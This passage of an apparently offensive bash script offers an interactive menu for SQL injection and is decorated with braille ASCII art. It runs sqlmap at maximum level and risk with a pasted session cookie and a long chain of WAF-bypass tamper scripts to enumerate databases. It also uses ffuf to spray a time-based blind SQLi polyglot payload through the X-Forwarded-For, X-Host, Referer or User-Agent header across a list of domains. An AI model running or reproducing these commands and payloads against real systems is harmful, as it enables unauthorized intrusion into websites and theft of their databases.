⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣝⣛⣛⣛⠛⣯⣭⣵⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⢿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣿⣿⣿⣿⡿⠿⢛⣛⣭⣭⣷⣶⣶⣾⣿⣿⣿⣿⣿⣶⣶⣾⣭⣭⣛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢟⣋⣭⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣮⣝⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣋⣭⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠻⣛⠛⣛⣋⣑⡺⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠟⣛⣭⣶⢪⣾⣿⣿⡟⣼⣿⣿⣿⢏⣾⣿⣿⣶⡮⣩⣛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣛⣛⠋⠉⠩⠭⠍⠛⢛⡛
⣿⠿⡫⣰⣿⣿⣿⡏⣾⣿⣿⣿⢧⣿⣿⣿⡿⣼⣿⣿⣿⣿⢱⣿⣿⣿⣷⡶⣭⣝⣛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⡿⢸⣿⣿⣿⢣⣾⣶⡾
⢡⣾⢱⣿⣿⣿⣿⢣⣿⣿⣿⡿⣸⣿⣿⣿⡇⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⢱⣿⣿⣿⣿⢳⣶⣭⣝⣛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠹⣧⠽⠿⣛⣛⡬⣽⣶⣾
⣾⣿⣼⣿⣿⣿⡿⢸⣿⣿⣿⢇⣿⣿⣿⣿⢸⣿⣿⣿⣿⢳⣿⣿⣿⣿⡏⣾⣿⣿⣿⣿⢸⣿⣿⣿⣿⣮⢻⣷⣶⣶⣾⣍⢩⣭⣭⣿⣿⣟⢻⣶⣶⣶⣾⡍⣿⣿⣿⣿⡜⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿⣿⡏⣾⣿⣿⣿⣿⢸⣿⣿⣿⣿⢧⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⡎⣿⣿⣿⣿⣿⢸⣿⣿⣿⣷⢻⣿"
echo "\033[0;31m-------------------------------------------------\033[0;33m "
Target
echo "\033[0;31m-------------------------------------------------\033[1;33m "
echo "\033[1;35m[*] Use \033[1;33mSqlmap\033[1;35m to  bypass WAF by using Tampering                            [1]"
echo "\033[0;35m[*] Find Time Base SQL Injection                                            [2]\033[1;33m"
read -p "[*] Enter your SQLi Finding method (1-2): " sql_choice 
case $sql_choice in
1)
read -p "[+] Please provide 1 domain name : " url
read -p "[?] Do you want to  test (All types of sqli) [1] or (Only Time base) [2] : " protocol
case $protocol in 
2) 
read -p "[+] Please copy your cookie Values from BURP request and Past it here : Cookie= " cookie
sqlmap -u "$url" --level=5 --crawl=10 --risk=3 --cookie="$cookie" --tamper=apostrophemask,apostrophenullencode,base64encode,between,charencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbs --random-agent --technique=T --batch 
;;
1)
read -p "[+] Please copy your cookie Values from BURP request and Past it here : Cookie= " cookie
sqlmap -u "$url" --level=5 --crawl=10 --risk=3 --cookie="$cookie"  --tamper=apostrophemask,apostrophenullencode,base64encode,between,charencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbs --random-agent --batch 
;;
*)
echo "\033[0;31m-------------------------------------------------\033[1;33m "
echo "[!] \033[1;31mInvalid choice. Exiting..."
exit 1
;;
esac
;;

2)
echo " Finding Header Time Base SQL Injection!  "
pwd
ls
echo "\033[0;31m-------------------------------------------------\033[1;33m "
read -p "[+] Please provide Domains.txt file: " domain_file
echo "\033[0;31m-------------------------------------------------\033[0;33m "
echo "[*] X-Forwarded-For:       (1)"
echo "[*] X-Host:                (2)"
echo "[*] Referer:               (3)"
echo "[*] User-Agent:            (4)"
echo "\033[0;31m-------------------------------------------------\033[1;33m "
read -p "Please choose any one  Header (1-4): " header
echo "\e[5;92m Finding Header base SQLi...\e[0m"
case $header in
1)
ffuf -w $domain_file -u FUZZ -H "X-Forwarded-For: IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(5))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(5)))OR'|'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(5)))OR'*/" -c 200 -o json --timeout 6 | tee -a Header_SQLi.txt
echo "\e[5;92m Finding Done!\e[0m"
;;
2)
ffuf -w $domain_file -u FUZZ -H "X-Host: IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(5))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(5)))OR'|'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(5)))OR'*/" -c 200 -o json --timeout 6 | tee -a Header_SQLi.txt
echo "\e[5;92m Finding Done!\e[0m"
;;
3)
ffuf -w $domain_file -u FUZZ -H "Referer: IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(5))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(5)))OR'|'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(5)))OR'*/" -c 200 -o json --timeout 6 | tee -a Header_SQLi.txt
echo "\e[5;92m Finding Done!\e[0m"
;;
4)
ffuf -w $domain_file -u FUZZ -H "User-Agent: IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(5))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(5)))OR'|'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(5)))OR'*/" -c 200 -o json --timeout 6 | tee -a Header_SQLi.txt
echo "\e[5;92m Finding Done!\e[0m"
;;


*)
echo "\033[0;31m-------------------------------------------------\033[1;33m "
echo "[!] \033[1;31mInvalid choice. Exiting..."
exit 1
;;
esac
;;

# echo "Its End of this header case " 





*)
echo "\033[0;31m-------------------------------------------------\033[1;33m "
echo "[!] \033[1;31mInvalid choice. Exiting..."
exit 1
;;
esac
;;

*)
echo "\033[1;31m-------------------------------------------------\033[1;33m\e[5;1;91m "
ifconfig | grep broadcast | awk '{print $2}'
echo "\033[1;31m-------------------------------------------------\033[1;33m\e[5;1;91m "
echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⢤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠲⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡼⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⢖⣠⡴⠒⠊⠁⠠⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⢞⣡⠖⠉⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠲⠶⠶⠶⠶⢒⡲⠒⠀⠀⠀⠀⠈⢣⣀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠏⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠴⠭⠤⠤⣄⣀⣀⡀⠀⠀⠈⠳⠤⣀⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣰⠃⠀⠀⠀⣀⣤⣤⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡔⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⠀⠀⣠⣾⡿⡝⠂⠀⠈⠉⠙⠻⣶⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢉⣩⠥⠶⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⢠⣾⣿⣿⡇⠀⠀⠀⠰⣞⢽⣿⠀⠉⢷⡀⢰⠀⠀⠀⠀⠀⠰⡚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⠿⠿⣿⢿⣶⣤⣀⠉⠉⠀⠀⠀⢳⣸⠀⢸⠀⠀⢀⠀⠈⠳⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠏⠘⣉⣛⣉⣳⠻⡝⠿⣿⣦⣄⡀⠀⢸⣿⡄⣼⠀⠀⢹⡅⠀⠈⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠇⠀⠀⠛⠛⠛⠋⣠⣿⣷⣮⡻⣿⣿⣶⣾⣿⣧⣿⠸⢦⡀⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡻⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢤⡆⠙⢾⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⣽⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠿⢧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⠁⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⠖⣾⡷⢤⠋⢬⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡆⢠⠁⠀⣞⠙⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⡟⡇⠈⠓⢶⣿⣿⣿⣾⣿⣿⣿⣿⣷⣿⣿⠋⢉⢹⠀⠀⣿⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⡇⠀⢠⠃⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠁⢸⠀⠀⣿⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⡿⠀⠐⡀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⣼⠀⢰⠻⠀⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣠⠤⠖⢻⠀⠀⣷⡆⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣼⡇⢠⠏⠓⠦⣄⠀⠀⠀⠀⣠⠖⠋⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣠⠶⠋⠉⠀⠀⠀⠈⠳⣄⣿⣳⠶⠋⠁⠐⠚⠛⠻⠈⡿⣏⠉⠉⠉⠉⠀⠀⠻⣶⣿⠷⠛⠀⠀⠀⠀⠉⠑⠲⣌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⠞⠳⢄⡀⠀⢀⣀⠀⠀⠀⠀⠈⣏⣶⢦⠀⠀⠀⠀⠀⠀⣿⠚⠀⠀⠀⠀⣀⠀⣴⣳⠋⠀⣀⣠⠖⠀⠀⠀⠀⣀⠬⠷⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣠⣿⣦⡙⢦⡀⠈⠳⣄⣀⡀⠀⢸⠸⡄⠳⡀⠀⠀⠀⢸⡙⠀⠀⠀⠀⡸⠁⢰⠣⣇⠀⠀⠛⠁⠀⠀⢀⣴⣺⣵⣿⣆⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⡿⣿⣿⣿⣦⡙⢦⡀⠈⠙⣃⣠⠼⣠⠇⠀⢣⠀⠀⠀⣿⡇⠀⠀⠀⡼⠁⠀⠘⠲⢭⣓⣒⠦⢤⣠⠔⣫⣾⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⡇⢸⣿⣿⣿⣷⣤⣉⣉⣭⠽⠖⠋⠁⠀⠀⠘⡇⠀⠀⡿⡇⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠉⢹⣶⣶⣾⣿⣿⣿⣿⡟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⡆⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⡇⡇⠀⢰⠃⠀⢀⢀⣀⣀⣀⣀⢸⣼⣿⣿⣿⣿⣿⣿⣿⣷⣧⡀⠽⣃⣀⠀⠀⠀⠀⠀
⢀⣾⣿⣿⣿⣿⣿⠟⠻⠧⣉⠛⢅⠈⠙⠋⠉⠙⠛⠛⡆⠀⠁⠁⠀⡾⠋⢹⡿⠁⠀⣿⠀⠀⡉⣿⣿⣿⣿⣿⣿⣿⣿⡏⡏⡇⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣿⣿⣿⣿⣿⡙⠓⠂⢌⢦⠘⣄⣀⡀⠀⠀⠀⠀⡇⠀⣸⠁⠀⡇⠀⢸⡇⠀⢸⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠿⠁⠀⠀⠀⠀⠀⠀"
echo "\e[0m\033[1;31m-------------------------------------------------\033[1;33m "
echo ""
echo "[!] \e[5;91mInvalid choice. Exiting...\e[0m"
exit 1
;;
esac
